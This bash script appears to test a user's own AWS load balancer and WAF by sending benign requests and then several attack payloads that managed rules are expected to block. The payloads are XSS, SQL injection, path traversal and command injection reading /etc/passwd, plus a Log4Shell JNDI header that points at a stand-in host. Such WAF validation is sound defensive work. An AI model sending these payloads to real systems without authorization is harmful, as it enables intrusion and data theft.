#!/usr/bin/env bash
#
# Send traffic to the ALB so you have something to see in the WAF logs.
# Sends a batch of benign requests, then a few that AWS managed rules should BLOCK
# (XSS, SQLi, path traversal, Log4Shell-style header). Prints the HTTP status of each.
#
# Usage:
#   ./generate-traffic.sh                 # resolves the URL from `terraform output`
#   ./generate-traffic.sh http://my-alb-123.us-east-1.elb.amazonaws.com
#
# A 200 means the request was allowed through to an instance.
# A 403 from the load balancer means WAF blocked it.

set -euo pipefail

URL="${1:-}"
if [[ -z "$URL" ]]; then
  TF_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
  URL="$(terraform -chdir="$TF_DIR" output -raw alb_url 2>/dev/null || true)"
fi
if [[ -z "$URL" ]]; then
  echo "Could not resolve the ALB URL. Pass it as an argument:" >&2
  echo "  $0 http://<alb-dns-name>" >&2
  exit 1
fi

echo "Target: $URL"
echo

req() {
  # req "<label>" curl-args...
  local label="$1"; shift
  local code
  code="$(curl -s -o /dev/null -w '%{http_code}' --max-time 10 "$@")"
  printf '  %-28s -> HTTP %s\n' "$label" "$code"
}

echo "Benign requests (expect 200):"
for i in $(seq 1 8); do
  req "GET / (#$i)" "$URL/"
done

echo
echo "Requests AWS managed rules should block (expect 403):"
req "XSS in query string"     "$URL/?q=<script>alert(1)</script>"
req "SQL injection"           "$URL/?id=1%27%20OR%20%271%27=%271"
req "Path traversal"          "$URL/?file=../../../../etc/passwd"
req "Log4Shell header"        -H 'User-Agent: ${jndi:ldap://evil.example/a}' "$URL/"
req "Command injection"       "$URL/?cmd=;cat%20/etc/passwd"

echo
echo "Done. Give the logs ~1-2 minutes to arrive, then run ./view-waf-logs.sh"
